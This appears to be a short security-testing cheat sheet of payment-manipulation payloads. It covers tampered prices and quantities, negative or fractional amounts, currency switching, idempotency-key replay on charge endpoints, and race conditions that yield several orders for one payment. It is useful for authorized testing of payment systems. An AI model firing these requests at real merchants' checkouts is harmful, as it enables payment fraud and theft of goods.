<payment_manipulation>
<price_tampering>
{% raw %}
# Client-side price manipulation
# If price is sent from client:

POST /api/create-payment-intent
{
  "amount": 1,            # Changed from 10000
  "currency": "usd",
  "product_id": "prod_xxx"
}

# Test negative amounts
{"amount": -1000}

# Test very small amounts
{"amount": 1}

# Test currency switching
{"amount": 100, "currency": "inr"}  # vs "usd"

# Test fractional amounts
{"amount": 0.01}
{% endraw %}
</price_tampering>

<quantity_manipulation>
{% raw %}
# Product quantity attacks

# Order 10 items, pay for 1
{
  "items": [
    {"product_id": "prod_xxx", "quantity": 10}
  ],
  "payment_amount": 1000  # Price of 1 item
}

# Negative quantity
{"quantity": -1}

# Zero quantity with positive total
{"quantity": 0, "total": 10000}
{% endraw %}
</quantity_manipulation>

<idempotency_attacks>
{% raw %}
# Idempotency key manipulation

# Replay attack
# Use same idempotency key for different operations
Idempotency-Key: unique_key_123

# First request: legitimate payment
POST /v1/charges
Idempotency-Key: key_abc
{"amount": 1000}

# Second request: higher amount with same key
POST /v1/charges
Idempotency-Key: key_abc
{"amount": 100000}

# Key collision
# Try common/predictable keys
Idempotency-Key: 1
Idempotency-Key: test
Idempotency-Key: [customer_id]
{% endraw %}
</idempotency_attacks>

<race_conditions>
{% raw %}
# Race condition in payment verification

# 1. Send multiple checkout requests simultaneously
# 2. Only one payment charged, multiple orders created

# Payment intent race
# Create multiple intents, confirm one, cancel verification for others

# Subscription race
# Upgrade/downgrade simultaneously to get best of both
{% endraw %}
</race_conditions>
</payment_manipulation>

